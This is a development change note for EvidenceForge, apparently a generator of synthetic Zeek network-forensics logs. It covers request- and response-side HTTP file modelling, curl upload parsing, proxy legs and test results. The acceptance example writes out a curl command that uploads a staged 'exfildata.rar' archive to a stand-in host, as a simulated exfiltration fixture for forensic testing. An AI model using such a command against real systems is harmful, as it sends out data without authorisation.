# Bidirectional HTTP File Analysis

Date: 2026-08-12
Branch: `codex/http-upload-files-log`
Base: local `dev` at `4625a30a`

## Outcome

EvidenceForge now models every successfully transmitted nonempty request or
response entity on a Zeek-visible plaintext/decrypted HTTP connection as a
directional file transfer. The same canonical path handles authored connections,
baseline/browser requests, route/application profiles, beacons, red herrings,
and both visible legs of an explicit plaintext proxy transaction. HTTPS remains
opaque unless a model explicitly supplies decrypted HTTP visibility.

## Implementation Notes

- Added `request_body_len` to connection, beacon, and beacon HTTP-sequence
  authoring models and profile validation.
- Added canonical request entity metadata, including independent local source
  path/name and wire-visible filename fields, plus Zeek `orig_*` vectors.
- Generalized HTTP file analysis for request or response direction. Neither
  direction has size, MIME, status-class, provenance, or sampling gates.
- Normalized HEAD, 1xx, 204, 205, 304, successful CONNECT, zero-byte, and failed
  transport responses as fileless. Failed CONNECT, redirect, authentication,
  and other error bodies remain eligible when transmitted.
- Preserved explicit response MIME, then used application/route metadata, URI
  inference, redirect/error `text/html`, and final `application/octet-stream`
  fallback. Response URLs do not invent filenames.
- Added request-side byte, packet, duration, capture-loss, observation, and
  sensor-local identifier reconciliation. File and PE analysis timestamps are
  bounded by the owning connection and follow the referenced direction.
- Added curl parsing for `--data-binary @path`, `--upload-file`, `-T`, and
  multipart `-F`; raw curl uploads intentionally do not expose a Zeek filename.
  Staged archives and route/application request metadata can also supply entity
  truth without conflating endpoint paths with wire filenames.
- Added endpoint file-read evidence only when a local path is resolved. Generic
  form, JSON, API, telemetry, and other anonymous bodies do not invent endpoint
  file activity.
- Added overlay-aware `http_file_profiles.yaml`, its validation schema, and
  `.rar` to `application/vnd.rar` mapping.
- Extended evaluation field-agreement checks across `http.log` and `files.log`
  for sensor instance, FUID, connection UID, direction, size, MIME, and filename.
- Updated explicit proxy response projection: MISS creates correlated
  origin→proxy and proxy→client files with different FUIDs and identical content
  identity; HIT and proxy-generated error bodies create only client-leg files;
  pre-origin failures do not fabricate egress files.
- Suppressed speculative PE analysis for tiny ambiguous octet-stream bodies while
  retaining PE analysis for explicit executable MIME and plausible larger binary
  content.
- Updated canonical docs, scenario/generate/evaluate skills, bundled references,
  and install/reference-sync gates. Removed all stale response-sampling guidance.
- Added durable TODOs for true multipart HTTP, a canonical SMB operation redesign,
  FTP, and TLS client-certificate/mTLS support.

SMTP behavior remains intact: successfully delivered plaintext SMTP MIME parts
are originator-side files on both inbound and outbound SMTP tuples. STARTTLS
keeps the message body opaque; only TLS certificate file analysis is visible.

## Acceptance Example

The permanent integration test models `hostA` running:

```text
C:\Windows\System32\curl.exe --data-binary @C:\Temp\exfildata.rar http://some.site/uploads/accept-upload
```

with `request_body_len: 44040192`. It verifies the matching originator FUID and
connection UID, `application/vnd.rar`, exact size, client-to-server direction,
absence of `orig_filenames`, SHA-1 analysis, curl-owned endpoint `FILE/READ`,
local path/name ground truth, and connection-bounded file timing.

## Verification

- Permanent end-to-end 42 MiB RAR integration regression: passed.
- Complete response acceptance matrix across direct HTTP, proxies, observation,
  timing, evaluator, docs, skills, and the upload integration: `948 passed`.
- First post-response full default run: `5447 passed, 42 skipped, 3 failed`.
  Two response-related expectations were corrected and rerun successfully. The
  remaining DNS SRV failure passed in isolation and is unrelated order/state
  leakage outside this change.
- Clean-twin integration with complete responder files: passed after teaching
  the differential harness that correlated `files.log` size/hash differences are
  injection-owned evidence.
- Final repository-wide default suite: `5450 passed, 42 skipped, 1 failed` in
  340.28 seconds. The sole failure is the same unrelated order-dependent DNS SRV
  assertion (`dc-01.example.com` versus `hostA.corp.local`); it passes in
  isolation. No HTTP response, proxy, files, observation, documentation, skill,
  or upload regression failed.
- Final quality gates: `uv run ruff check .`,
  `uv run ruff format --check .`, and `git diff --check` all passed.
- Final installed-skill/reference regression rerun: `45 passed`; a repository-wide
  stale-language scan found no remaining response sampling or download-scale-only
  guidance.
- Version artifacts are unchanged, as required for the feature branch.
